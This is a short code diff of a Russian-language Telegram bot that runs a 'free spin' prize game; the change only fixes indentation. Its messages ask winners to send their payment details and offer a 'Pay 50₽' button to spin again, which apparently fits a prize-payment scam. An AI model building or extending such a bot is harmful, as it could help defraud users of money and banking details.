@@ -129,14 +129,15 @@ def handle_free_spin(call):
     code = generate_code(amount, uid)
     user_states[uid] = {"amount": amount, "code": code}
     paid_users.discard(uid)
+    
     pay_markup = InlineKeyboardMarkup().add(
-    InlineKeyboardButton("💸 Оплатить 50₽", callback_data="pay")
-)
+        InlineKeyboardButton("💸 Оплатить 50₽", callback_data="pay")
+    )
 
-if amount == 0:
-    bot.send_message(uid, "😢 Увы, вы ничего не выиграли. Попробуйте ещё раз после оплаты!", reply_markup=pay_markup)
-else:
-    bot.send_message(uid, f"🎉 ПОБЕДА {amount}₽!\nКод: `{code}`\nОтправь свои реквизиты:", parse_mode="Markdown", reply_markup=pay_markup)
+    if amount == 0:
+        bot.send_message(uid, "😢 Увы, вы ничего не выиграли. Попробуйте ещё раз после оплаты!", reply_markup=pay_markup)
+    else:
+        bot.send_message(uid, f"🎉 ПОБЕДА {amount}₽!\nКод: `{code}`\nОтправь свои реквизиты:", parse_mode="Markdown", reply_markup=pay_markup)
 
 
     
